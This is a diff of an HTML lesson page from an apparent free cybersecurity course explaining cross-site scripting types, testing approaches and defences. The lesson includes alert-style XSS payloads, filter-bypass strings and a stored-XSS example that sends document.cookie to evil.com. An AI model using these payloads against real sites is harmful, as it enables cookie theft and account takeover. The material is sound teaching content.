@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<base href="/">
 <title>Cross-Site Scripting — Path 11 · KashSec Academy</title>
 <meta name="description" content="You planted the seed for this back in Path 05.2. Now let's fully understand, find, and exploit Cross-Site Scripting — one of the most historically significant web vulnerability classes, and still huge">
 <link rel="canonical" href="https://kashsec.vercel.app/lesson/11-web-security/xss.html">
@@ -21,68 +22,98 @@
 <meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
 <meta name="theme-color" content="#0A0E13">
 <meta name="google-adsense-account" content="ca-pub-7042949574293510">
+<link rel="manifest" href="/manifest.json">
+<link rel="alternate" type="application/rss+xml" title="KashSec Academy — What's new" href="/feed.xml">
+<link rel="apple-touch-icon" href="/icons/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/styles.css">
+<script src="/ads.js" defer></script>
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"KashSec Academy","item":"https://kashsec.vercel.app/"},{"@type":"ListItem","position":2,"name":"Learning paths","item":"https://kashsec.vercel.app/lesson/"},{"@type":"ListItem","position":3,"name":"Path 11 — Web Security & Hacking","item":"https://kashsec.vercel.app/lesson/11-web-security/"},{"@type":"ListItem","position":4,"name":"Cross-Site Scripting","item":"https://kashsec.vercel.app/lesson/11-web-security/xss.html"}]}
 </script>
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"LearningResource","name":"Cross-Site Scripting","headline":"Cross-Site Scripting","description":"You planted the seed for this back in Path 05.2. Now let's fully understand, find, and exploit Cross-Site Scripting — one of the most historically significant web vulnerability classes, and still huge","url":"https://kashsec.vercel.app/lesson/11-web-security/xss.html","inLanguage":"en","dateModified":"2026-07-26","learningResourceType":"Lesson","educationalLevel":"Intermediate","timeRequired":"PT10M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"Reflected, stored, DOM — and how to prove it safely.","isPartOf":{"@type":"Course","name":"Path 11: Web Security & Hacking","url":"https://kashsec.vercel.app/lesson/11-web-security/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/11-web-security/xss.html"}}
 </script>
-<style>
-:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
-html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
-main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
-.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
-.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
-.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
-.crumb a{color:var(--teal);text-decoration:none}
-.pager{display:flex;justify-content:space-between;gap:1rem;margin-top:2.5rem;padding-top:1.2rem;border-top:1px solid var(--border);font-size:.88rem}
-.pager a{color:var(--teal);text-decoration:none}
-h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
-h1{font-size:2rem;margin:.5rem 0 1rem}
-h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
-a{color:var(--teal)}
-code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
-pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
-pre code{background:transparent;color:var(--text);padding:0}
-blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
-table{width:100%;border-collapse:collapse;margin:1rem 0}
-th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
-th{background:var(--surface)}
-img{max-width:100%;height:auto}
-footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
-</style>
 </head>
 <body>
-<main>
-  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="/#/lesson/11-web-security/xss">continue here →</a></div>
-  <div class="crumb"><a href="https://kashsec.vercel.app/">KashSec Academy</a> · <a href="https://kashsec.vercel.app/lesson/">Learning paths</a> · <a href="https://kashsec.vercel.app/lesson/11-web-security/">Path 11 — Web Security &amp; Hacking</a> · Cross-Site Scripting</div>
-  <article><h1>XSS — Cross-Site Scripting</h1>
-<p>You planted the seed for this back in Path 05.2. Now let&#39;s fully understand, find, and exploit <strong>Cross-Site Scripting</strong> — one of the most historically significant web vulnerability classes, and still hugely common today.</p>
+<a class="skip" href="/lesson/11-web-security/xss.html#app">Skip to content</a>
+<header class="nav" id="siteNav">
+  <a class="brand" href="#/" aria-label="KashSec Academy — home">
+    <span class="brand-mark">
+      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+    </span>
+    <span class="brand-txt">KashSec<span class="amber">.</span></span>
+  </a>
+  <nav class="nav-links" id="navLinks" aria-label="Primary">
+    <a href="#/">Home</a>
+    <a href="#/course">Course</a>
+    <a href="#/tracks">Tracks</a>
+    <a href="#/labs">Labs</a>
+    <a href="#/tasks">Practice</a>
+    <a href="#/tools">Tools</a>
+    <a href="#/glossary">Glossary</a>
+    <a href="#/roadmap">Roadmap</a>
+    <a href="#/careers">Careers</a>
+    <a href="#/faq">FAQ</a>
+    <a href="#/progress">My Progress</a>
+    <a href="#" id="accountNavLink" class="account-nav-link" style="display:none">Sign in</a>
+  </nav>
+  <div class="nav-cta">
+    <button class="icon-btn" id="searchBtn" aria-label="Search lessons (Ctrl+K)" type="button" title="Search (Ctrl+K)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    </button>
+    <button class="icon-btn theme-toggle" id="themeToggle" aria-label="Toggle light/dark theme" aria-pressed="false" type="button">
+      <svg class="ico-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="ico-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+    <button class="icon-btn" id="randomLessonBtn" aria-label="Jump to a random lesson" type="button" title="Random lesson (R)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="3"/><circle cx="8" cy="8" r="1.4" fill="currentColor"/><circle cx="16" cy="8" r="1.4" fill="currentColor"/><circle cx="12" cy="12" r="1.4" fill="currentColor"/><circle cx="8" cy="16" r="1.4" fill="currentColor"/><circle cx="16" cy="16" r="1.4" fill="currentColor"/></svg>
+    </button>
+    <span class="streak-badge" id="streakBadge" title="Learning streak — visit on consecutive days to grow it" hidden>🔥<b id="streakN">0</b></span>
+    <a class="icon-btn progress-ring-btn" id="progressRingBtn" href="#/progress" aria-label="Your progress">
+      <svg viewBox="0 0 36 36"><circle class="ring-track" cx="18" cy="18" r="15.5"/><circle class="ring-fill" id="ringFill" cx="18" cy="18" r="15.5" stroke-dasharray="97.4" stroke-dashoffset="97.4"/></svg>
+    </a>
+    <button class="icon-btn" id="installBtn" aria-label="Install KashSec app for offline use" type="button" title="Install app" hidden>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+    </button>
+    <a class="btn-amber sm" id="startBtn" href="#/lesson/01-introduction">Start</a>
+    <button class="hamb" id="hamb" aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+  </div>
+</header>
+<main id="app" tabindex="-1">
+  <div class="reader-wrap"><div class="reader-main">
+    <nav class="reader-crumb" aria-label="Breadcrumb"><a href="https://kashsec.vercel.app/">KashSec Academy</a> · <a href="https://kashsec.vercel.app/lesson/">Learning paths</a> · <a href="https://kashsec.vercel.app/lesson/11-web-security/">Path 11 — Web Security &amp; Hacking</a> · Cross-Site Scripting</nav>
+    <div class="md" id="content"><article><h1>XSS — Cross-Site Scripting</h1>
+<p>You planted the seed for this back in Path 05.2. Now let's fully understand, find, and exploit <strong>Cross-Site Scripting</strong> — one of the most historically significant web vulnerability classes, and still hugely common today.</p>
 <h2>The core idea, precisely</h2>
-<p>XSS happens when an application includes <strong>untrusted input</strong> in a page&#39;s output <strong>without properly neutralising it</strong>, allowing an attacker&#39;s JavaScript to execute in another user&#39;s browser, in the context of the vulnerable site.</p>
-<p>The critical phrase is <em>&quot;in the context of the vulnerable site&quot;</em> — the malicious script runs with the same access as the site&#39;s own legitimate JavaScript: same cookies (unless HttpOnly), same DOM, same ability to make authenticated requests.</p>
+<p>XSS happens when an application includes <strong>untrusted input</strong> in a page's output <strong>without properly neutralising it</strong>, allowing an attacker's JavaScript to execute in another user's browser, in the context of the vulnerable site.</p>
+<p>The critical phrase is <em>"in the context of the vulnerable site"</em> — the malicious script runs with the same access as the site's own legitimate JavaScript: same cookies (unless HttpOnly), same DOM, same ability to make authenticated requests.</p>
 <h2>The three types</h2>
 <h3>1. Reflected XSS</h3>
-<p>The payload is part of the request and immediately &quot;reflected&quot; back in the response — not stored anywhere. Requires tricking a victim into clicking a crafted link.</p>
+<p>The payload is part of the request and immediately "reflected" back in the response — not stored anywhere. Requires tricking a victim into clicking a crafted link.</p>
 <pre><code>https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 </code></pre>
-<p>If the site echoes the search term straight into the page without escaping, visiting that URL executes the script <em>in the victim&#39;s browser</em>, not the attacker&#39;s.</p>
+<p>If the site echoes the search term straight into the page without escaping, visiting that URL executes the script <em>in the victim's browser</em>, not the attacker's.</p>
 <h3>2. Stored XSS</h3>
 <p>The payload is saved on the server (a comment, a username, a profile bio) and served to <strong>every</strong> visitor who views that stored content — no need to trick anyone into clicking a special link. Generally considered more dangerous because of its broader, persistent reach.</p>
 <pre><code class="language-html">&lt;!-- Attacker submits this as a blog comment: --&gt;
-&lt;script&gt;fetch(&#39;https://evil.com/steal?c=&#39; + document.cookie)&lt;/script&gt;
+&lt;script&gt;fetch('https://evil.com/steal?c=' + document.cookie)&lt;/script&gt;
 </code></pre>
-<p>Every visitor who reads that comment thread runs the attacker&#39;s script.</p>
+<p>Every visitor who reads that comment thread runs the attacker's script.</p>
 <h3>3. DOM-based XSS</h3>
-<p>The vulnerability lives entirely in <strong>client-side JavaScript</strong> — the server may never even see the malicious payload. The page&#39;s own JS takes some attacker-controlled input (often from the URL fragment <code>#...</code> or <code>location.search</code>) and unsafely inserts it into the DOM.</p>
+<p>The vulnerability lives entirely in <strong>client-side JavaScript</strong> — the server may never even see the malicious payload. The page's own JS takes some attacker-controlled input (often from the URL fragment <code>#...</code> or <code>location.search</code>) and unsafely inserts it into the DOM.</p>
 <pre><code class="language-javascript">// Vulnerable client-side code:
-const name = new URLSearchParams(location.search).get(&quot;name&quot;);
-document.getElementById(&quot;greeting&quot;).innerHTML = &quot;Hello, &quot; + name;
+const name = new URLSearchParams(location.search).get("name");
+document.getElementById("greeting").innerHTML = "Hello, " + name;
 </code></pre>
 <p>Visiting <code>https://example.com/?name=&lt;img src=x onerror=alert(1)&gt;</code> triggers execution purely client-side — the server logs might show nothing unusual at all, since the payload never left the browser.</p>
 <h2>A visual comparison</h2>
 <h2>What an attacker actually does with it</h2>
-<p>Once JavaScript executes on a victim&#39;s page, in the site&#39;s own origin, the attacker can:</p>
+<p>Once JavaScript executes on a victim's page, in the site's own origin, the attacker can:</p>
 <ul>
 <li><strong>Steal session cookies</strong> (if not <code>HttpOnly</code>) → full account takeover.</li>
 <li><strong>Perform actions as the victim</strong> — change their email/password, send messages, make purchases.</li>
@@ -98,15 +129,15 @@ document.getElementById(&quot;greeting&quot;).innerHTML = &quot;Hello, &quot; + 
 </ol>
 <pre><code class="language-html">&lt;script&gt;alert(document.domain)&lt;/script&gt;
 </code></pre>
-<ol start="3">
-<li>If it doesn&#39;t fire, the app may be doing <strong>partial</strong> filtering. Try common bypasses:</li>
+<ol>
+<li>If it doesn't fire, the app may be doing <strong>partial</strong> filtering. Try common bypasses:</li>
 </ol>
 <pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;
-&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 javascript:alert(1)
 </code></pre>
-<ol start="4">
+<ol>
 <li>Check where exactly your input lands by viewing page source / Inspector — is it inside an HTML attribute? Inside a <code>&lt;script&gt;</code> block? Inside a comment? Each context needs a different bypass technique.</li>
 </ol>
 <h2>Context matters enormously</h2>
@@ -126,28 +157,28 @@ javascript:alert(1)
 </tr>
 <tr>
 <td>HTML attribute</td>
-<td><code>&lt;input value=&quot;{input}&quot;&gt;</code></td>
-<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&quot; onmouseover=&quot;alert(1)</code></td>
+<td><code>&lt;input value="{input}"&gt;</code></td>
+<td><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>" onmouseover="alert(1)</code></td>
 </tr>
 <tr>
 <td>JavaScript string</td>
-<td><code>var name = &quot;{input}&quot;;</code></td>
-<td><code>&quot;;alert(1);//</code></td>
+<td><code>var name = "{input}";</code></td>
+<td><code>";alert(1);//</code></td>
 </tr>
 <tr>
 <td>URL/href attribute</td>
-<td><code>&lt;a href=&quot;{input}&quot;&gt;</code></td>
+<td><code>&lt;a href="{input}"&gt;</code></td>
 <td><code>javascript:alert(1)</code></td>
 </tr>
 </tbody></table>
-<p>This is why professional testers try many payload variants systematically rather than one universal &quot;magic string&quot; — <strong>PortSwigger&#39;s XSS cheat sheet</strong> (linked below) is the field&#39;s shared reference for exactly this.</p>
+<p>This is why professional testers try many payload variants systematically rather than one universal "magic string" — <strong>PortSwigger's XSS cheat sheet</strong> (linked below) is the field's shared reference for exactly this.</p>
 <h2>Defences — how XSS is actually prevented</h2>
 <h3>1. Output encoding (the primary defence)</h3>
 <p>Convert dangerous characters to their safe HTML-entity equivalents <strong>based on the specific output context</strong>:</p>
 <pre><code>&lt;  →  &amp;lt;
 &gt;  →  &amp;gt;
-&quot;  →  &amp;quot;
-&#39;  →  &amp;#x27;
+"  →  &amp;quot;
+'  →  &amp;#x27;
 &amp;  →  &amp;amp;
 </code></pre>
 <p>Modern frameworks (React, Vue, Angular) do this <strong>automatically</strong> for standard text rendering — a major reason why XSS, while still common, is somewhat less catastrophic in modern framework-based apps than in the hand-rolled PHP era of the 2000s. The danger reappears when developers explicitly opt out of this protection:</p>
@@ -160,35 +191,35 @@ javascript:alert(1)
 <p>That function name is not being dramatic — it is exactly as dangerous as it sounds.</p>
 <h3>2. Content Security Policy (CSP)</h3>
 <p>An HTTP response header restricting which script sources the browser is allowed to execute at all:</p>
-<pre><code class="language-http">Content-Security-Policy: script-src &#39;self&#39; https://trusted-cdn.com
+<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://trusted-cdn.com
 </code></pre>
 <p>Even if an XSS payload gets injected into the HTML, a strict CSP can prevent it from actually executing (e.g., blocking inline <code>&lt;script&gt;</code> tags entirely). Not a silver bullet — CSP bypasses exist — but a genuinely strong defence-in-depth layer.</p>
 <h3>3. HttpOnly cookies</h3>
-<p>As covered in Path 05.4 — doesn&#39;t prevent XSS itself, but limits the damage: even if an attacker&#39;s script runs, it can&#39;t read the session cookie directly.</p>
+<p>As covered in Path 05.4 — doesn't prevent XSS itself, but limits the damage: even if an attacker's script runs, it can't read the session cookie directly.</p>
 <h3>4. Input validation (secondary, not primary)</h3>
 <p>Rejecting obviously malicious input patterns helps, but is easily bypassed and should never be the <em>only</em> defence — output encoding based on context is the real fix.</p>
 <h2>Blind XSS — when you never see the payload fire</h2>
-<p>A distinct and genuinely tricky variant worth naming: <strong>blind XSS</strong> happens when the injected payload executes somewhere the attacker <em>can&#39;t directly observe</em> — a support ticket viewed only by internal staff, an admin dashboard&#39;s log viewer, a &quot;contact us&quot; form whose submissions only an internal team ever opens. Because the attacker never sees the alert box pop up on their own screen, standard testing (submit payload, check if it fires) doesn&#39;t work here at all. The practical technique: instead of <code>alert(1)</code>, use a payload that phones home to an attacker-controlled server when it executes — tools like <strong>XSS Hunter</strong> generate a unique tracking script for exactly this purpose, so if a payload ever fires in some internal admin panel days later, the tester gets a notification with a screenshot and cookie dump from that hidden execution context. Blind XSS is a genuinely common, high-impact finding in bug bounty programs precisely because it targets the parts of an application ordinary testing never reaches.</p>
+<p>A distinct and genuinely tricky variant worth naming: <strong>blind XSS</strong> happens when the injected payload executes somewhere the attacker <em>can't directly observe</em> — a support ticket viewed only by internal staff, an admin dashboard's log viewer, a "contact us" form whose submissions only an internal team ever opens. Because the attacker never sees the alert box pop up on their own screen, standard testing (submit payload, check if it fires) doesn't work here at all. The practical technique: instead of <code>alert(1)</code>, use a payload that phones home to an attacker-controlled server when it executes — tools like <strong>XSS Hunter</strong> generate a unique tracking script for exactly this purpose, so if a payload ever fires in some internal admin panel days later, the tester gets a notification with a screenshot and cookie dump from that hidden execution context. Blind XSS is a genuinely common, high-impact finding in bug bounty programs precisely because it targets the parts of an application ordinary testing never reaches.</p>
 <h2>Self-XSS — the social engineering trap worth knowing</h2>
-<p>Not every &quot;XSS&quot; a user reports is real. <strong>Self-XSS</strong> describes a common scam pattern where an attacker convinces a victim to paste malicious JavaScript into their <em>own</em> browser console, framing it as some kind of hack, unlock, or free item — Facebook and other social platforms display persistent warnings in their DevTools console specifically because of how common this scam became. It&#39;s worth understanding as the inverse lesson to everything else in this file: the vulnerability class is real and serious when an <em>attacker</em> can make <em>someone else&#39;s</em> browser run code without their knowledge or consent — but a user knowingly pasting code into their own console isn&#39;t a vulnerability in the site at all, just a classic social-engineering trick exploiting the same DevTools power you learned to use responsibly back in Path 05.6.</p>
+<p>Not every "XSS" a user reports is real. <strong>Self-XSS</strong> describes a common scam pattern where an attacker convinces a victim to paste malicious JavaScript into their <em>own</em> browser console, framing it as some kind of hack, unlock, or free item — Facebook and other social platforms display persistent warnings in their DevTools console specifically because of how common this scam became. It's worth understanding as the inverse lesson to everything else in this file: the vulnerability class is real and serious when an <em>attacker</em> can make <em>someone else's</em> browser run code without their knowledge or consent — but a user knowingly pasting code into their own console isn't a vulnerability in the site at all, just a classic social-engineering trick exploiting the same DevTools power you learned to use responsibly back in Path 05.6.</p>
 <h2>🧪 Lab — PortSwigger XSS labs</h2>
 <ol>
 <li>Go to <a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger Web Security Academy — Cross-site scripting</a>.</li>
 <li>Work through the <strong>Reflected</strong>, <strong>Stored</strong>, and <strong>DOM-based</strong> XSS labs in order.</li>
-<li>For each, use Burp Repeater to understand exactly how your input reaches the vulnerable sink, then craft the specific payload the lab&#39;s context requires.</li>
+<li>For each, use Burp Repeater to understand exactly how your input reaches the vulnerable sink, then craft the specific payload the lab's context requires.</li>
 </ol>
-<p>Also try the browser console exercise from Path 05.2 again with fresh eyes — you now understand <em>how</em> an attacker&#39;s script would land there in the first place, not just what it can do once it has.</p>
-<p>An attacker submits a malicious comment on a blog post. The comment is saved to the database, and every visitor who later reads that post automatically executes the attacker&#39;s script. Which type of XSS is this?</p>
+<p>Also try the browser console exercise from Path 05.2 again with fresh eyes — you now understand <em>how</em> an attacker's script would land there in the first place, not just what it can do once it has.</p>
+<p>An attacker submits a malicious comment on a blog post. The comment is saved to the database, and every visitor who later reads that post automatically executes the attacker's script. Which type of XSS is this?</p>
 <details><summary>Show answer</summary><strong>Stored XSS.</strong> The payload persists on the server (in the database) and is served to every visitor who views that content — no crafted link or tricking a specific victim into clicking anything is required.</details><h2>Key terms</h2>
 <ul>
-<li><strong>XSS</strong> — injecting attacker-controlled JavaScript that executes in another user&#39;s browser, in the site&#39;s own context.</li>
+<li><strong>XSS</strong> — injecting attacker-controlled JavaScript that executes in another user's browser, in the site's own context.</li>
 <li><strong>Reflected / Stored / DOM-based XSS</strong> — the three types, differing in where the payload lives and how it reaches the victim.</li>
 <li><strong>Output encoding</strong> — converting dangerous characters to safe equivalents based on context; the primary defence.</li>
 <li><strong>CSP (Content Security Policy)</strong> — a header restricting which scripts a page is allowed to execute.</li>
 </ul>
 <h2>Recap</h2>
 <ul>
-<li>XSS lets attacker JavaScript run with the same access as the site&#39;s own legitimate scripts.</li>
+<li>XSS lets attacker JavaScript run with the same access as the site's own legitimate scripts.</li>
 <li>Reflected needs a crafted link per victim; Stored persists and hits every visitor; DOM-based lives entirely client-side.</li>
 <li>The correct bypass payload depends heavily on exactly where input lands in the page.</li>
 <li>Modern frameworks auto-escape by default — danger reappears when that protection is explicitly bypassed.</li>
@@ -198,23 +229,71 @@ javascript:alert(1)
 <ul>
 <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger — Cross-site scripting</a> — the definitive free hands-on resource.</li>
 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
-<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS cheat sheet</a> — the field&#39;s shared reference for context-specific payloads.</li>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS cheat sheet</a> — the field's shared reference for context-specific payloads.</li>
 <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy — MDN</a></li>
 </ul>
 <p><strong>Next up →</strong> <a href="#/lesson/11-web-security/web-security-headers-deep-dive">Web Security Headers: A Deep Dive</a></p>
-<nav class="pager"><a href="/lesson/11-web-security/clickjacking.html">← Clickjacking</a><a href="/lesson/11-web-security/web-security-headers-deep-dive.html">Web Security Headers: A Deep Dive →</a></nav></article>
-  <footer>© KashSec Academy · <a href="/lesson/">All learning paths</a> · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+<nav class="pager"><a href="/lesson/11-web-security/clickjacking.html">← Clickjacking</a><a href="/lesson/11-web-security/web-security-headers-deep-dive.html">Web Security Headers: A Deep Dive →</a></nav></article></div>
+  </div></div>
 </main>
-<script>
-// Redirect actual users into the SPA. Search-engine crawlers get to read
-// the content above before the redirect fires.
-(function(){
-  try {
-    var target = "/#/lesson/11-web-security/xss";
-    // Only redirect from the .html file, not from the SPA route itself.
-    if (location.pathname.endsWith('.html') || location.pathname.endsWith('/')) location.replace(target);
-  } catch (e) {}
-})();
-</script>
+<footer class="footer">
+  <div class="foot-top">
+    <div class="foot-brand">
+      <div class="brand">
+        <span class="brand-mark">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+        </span>
+        <span class="brand-txt">KashSec<span class="amber">.</span></span>
+      </div>
+      <p>Free cybersecurity education for complete beginners. Start from zero, learn by doing, and reach a real career.</p>
+    </div>
+    <div class="foot-cols">
+      <div><h4>Learn</h4>
+        <a href="#/course">All paths</a>
+        <a href="#/tracks">Tracks</a>
+        <a href="#/labs">Labs</a>
+        <a href="#/glossary">Glossary</a>
+        <a href="#/review">Flashcards</a>
+        <a href="#/daily">Daily challenge</a>
+        <a href="#/weekly">Weekly challenges</a>
+        <a href="#/quiz/shuffle">Shuffle quiz</a>
+        <a href="#/tasks">Practice tasks</a>
+        <a href="#/exam">Timed mock exam</a>
+        <a href="#/search">Search</a>
+      </div>
+      <div><h4>Explore</h4>
+        <a href="#/tools">Tools</a>
+        <a href="#/careers">Careers</a>
+        <a href="#/interview">Interview bank</a>
+        <a href="#/certs">Certification roadmap</a>
+        <a href="#/faq">FAQ</a>
+      </div>
+      <div><h4>About</h4>
+        <a href="#/about">About KashSec</a>
+        <a href="#/contact">Contact</a>
+        <a href="#/changelog">What's new</a>
+        <a href="/feed.xml">RSS feed</a>
+      </div>
+      <div><h4>Legal</h4>
+        <a href="#/privacy">Privacy policy</a>
+        <a href="#/terms">Terms of use</a>
+      </div>
+    </div>
+  </div>
+  <div class="foot-bottom">
+    <span>© <span id="year"></span> KashSec Academy · Free forever</span>
+    <span class="made">Learn · Practise · Get hired</span>
+  </div>
+</footer>
+<script src="quizzes.js" defer></script>
+<script src="lesson-hashes.js" defer></script>
+<script src="lesson-updated.js" defer></script>
+<script src="vendor/purify.min.js" defer></script>
+<script src="sync.js" defer></script>
+<script src="app.js" defer></script>
+<script src="analytics.js" defer></script>
+<script type="module" src="speed-insights.js"></script>
+<script type="module" src="web-analytics.js"></script>
+
 </body>
 </html>
